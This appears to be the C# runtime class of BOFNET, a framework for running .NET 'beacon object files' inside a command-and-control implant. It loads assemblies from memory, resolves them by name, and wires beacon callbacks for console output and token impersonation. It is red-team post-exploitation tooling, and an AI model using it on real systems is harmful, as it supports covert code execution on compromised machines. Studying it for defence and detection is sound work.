using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;

namespace BOFNET {
    public class Runtime {

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate MarshalByRefObject InitialiseChildBOFNETAppDomain([MarshalAs(UnmanagedType.LPWStr)] string appDomainName, [MarshalAs(UnmanagedType.LPArray)] byte[] data, int len);

        public class AssemblyInfo {
            public byte[] AssemblyData;
            public Assembly Assembly;
        }

        public static Dictionary<string, AssemblyInfo> LoadedAssemblies { get; private set; } = new Dictionary<string, AssemblyInfo>();

        public static Dictionary<int, BeaconJob> Jobs { get; private set; } = new Dictionary<int, BeaconJob>();

        static bool firstInit = true;

        [DllImport("shell32.dll", SetLastError = true)]
        static extern IntPtr CommandLineToArgvW(
            [MarshalAs(UnmanagedType.LPWStr)] string lpCmdLine, out int pNumArgs);

        private static Type FindType(string name) {

            //Try to get based on fully qualified name first
            Type type = Type.GetType(name);
            if(type != null) {
                return type;
            }

            //Coulnd't find it, so lets search all assemblies
            var results = AppDomain.CurrentDomain.GetAssemblies()
               .SelectMany(s => s.GetTypes())
               .Where(p => p.Name == name || p.FullName == name);
 
            if (results.Count() > 1) {
                throw new AmbiguousMatchException();
            }

            return results.FirstOrDefault();
        }

        private static string[] CommandLineToArgs(string commandLine) {
            int argc;
            var argv = CommandLineToArgvW(commandLine, out argc);
            if (argv == IntPtr.Zero)
                throw new System.ComponentModel.Win32Exception();
            try {
                var args = new string[argc];
                for (var i = 0; i < args.Length; i++) {
                    var p = Marshal.ReadIntPtr(argv, i * IntPtr.Size);
                    args[i] = Marshal.PtrToStringUni(p);
                }

                return args;
            } finally {
                Marshal.FreeHGlobal(argv);
            }
        }

        public static Assembly LoadAssembly(byte[] assemblyData) {
            Assembly assembly = AppDomain.CurrentDomain.Load(assemblyData);
            AssemblyName assemblyName = new AssemblyName(assembly.FullName);
            AssemblyInfo ai = new AssemblyInfo {
                AssemblyData = assemblyData,
                Assembly = assembly
            };

            LoadedAssemblies[assemblyName.Name] = ai;
            return assembly;
        }

        public static BeaconObject CreateBeaconObject(string bofName, BeaconOutputWriter bow, InitialiseChildBOFNETAppDomain initialiseChildBOFNETAppDomain, BeaconUseToken beaconUseToken, BeaconRevertToken beaconRevertToken) {

            Type bofType = FindType(bofName);

            if (bofType == null) {
                throw new TypeLoadException($"[!] Failed to find type {bofName} within BOFNET AppDomain, have you loaded the containing assembly yet?");
            }

            BeaconObject bo = (BeaconObject)Activator.CreateInstance(bofType, new object[] { new DefaultBeaconApi(bow, initialiseChildBOFNETAppDomain, beaconUseToken, beaconRevertToken) });
            return bo;
        }

        public static void RegisterRuntimeAssembly(byte[] assemblyData) {
            Runtime.AssemblyInfo ai = new Runtime.AssemblyInfo {
                Assembly = Assembly.GetExecutingAssembly(),
                AssemblyData = assemblyData
            };
            Runtime.LoadedAssemblies["BOFNET"] = ai;
        }

        public static void SetupAssemblyResolver() {
            Debug.WriteLine($"Running resolver from {AppDomain.CurrentDomain.FriendlyName}");
            if (firstInit) {
                AppDomain.CurrentDomain.AssemblyResolve += CurrentDomain_AssemblyResolve;
                firstInit = false;
            }
        }

        public static void InvokeBof(long[] beaconApis, string bofName, object args) {

            SetupAssemblyResolver();

            var beaconConsole = (BeaconConsoleWriter.BeaconConsoleWriterDelegate)Marshal.GetDelegateForFunctionPointer((IntPtr)(beaconApis[0]),
                                                                                                       typeof(BeaconConsoleWriter.BeaconConsoleWriterDelegate));
            var initialiseChildBOFNETAppDomain = (InitialiseChildBOFNETAppDomain)Marshal.GetDelegateForFunctionPointer((IntPtr)(beaconApis[1]),
                                                                                                      typeof(InitialiseChildBOFNETAppDomain));

            var beaconUseToken = (BeaconUseToken)Marshal.GetDelegateForFunctionPointer((IntPtr)(beaconApis[2]), typeof(BeaconUseToken));
            var beaconRevertToken = (BeaconRevertToken)Marshal.GetDelegateForFunctionPointer((IntPtr)(beaconApis[3]), typeof(BeaconRevertToken));

            using (BeaconConsoleWriter bcw = new BeaconConsoleWriter(beaconConsole)) {

                if (String.IsNullOrEmpty(bofName)) {
                    bcw.WriteLine($"[!] BOF name not supplied, don't know what to execute, bailing!");
                    return;
                }

                try {

                    BeaconObject bo = CreateBeaconObject(bofName, bcw,initialiseChildBOFNETAppDomain, beaconUseToken, beaconRevertToken);

                    if (args is string cmdLine) {
                        if (!string.IsNullOrEmpty(cmdLine))
                            bo.Go(CommandLineToArgs(cmdLine));
                        else
                            bo.Go(new string[] { });
                    } else if (args is byte[] raw) {
                        bo.Go(raw);
                    } else {
                        bcw.WriteLine($"[!] Unuspported argument type {args.GetType().FullName} when attempting to invoke BOF");
                    }

                } catch (TypeLoadException tle) {

                    bcw.WriteLine(tle.Message);

                } catch (AmbiguousMatchException) {

                    bcw.WriteLine($"[!] Multiple BOFs found with name {bofName}, use fully qualifed type including namespace");
                    return;

                } catch (ReflectionTypeLoadException rtle) {

                    bcw.WriteLine($"[!] Failed to load a type during BOFNET execution with the folowing loader exceptions:");
                    foreach (Exception e in rtle.LoaderExceptions) {
                        bcw.WriteLine($"{e}");
                    }
                    return;

                } catch (Exception e) {

                    bcw.WriteLine($"[!] BOFNET executed but threw an unhandled exception: {e}");

                }
            }
        }

        public static Assembly CurrentDomain_AssemblyResolve(object sender, ResolveEventArgs args) {

            AssemblyName assemblyName = new AssemblyName(args.Name);
            if (LoadedAssemblies.ContainsKey(assemblyName.Name)) {
                return LoadedAssemblies[assemblyName.Name].Assembly;
            } else {
                return null;
            }
        }
    }
}
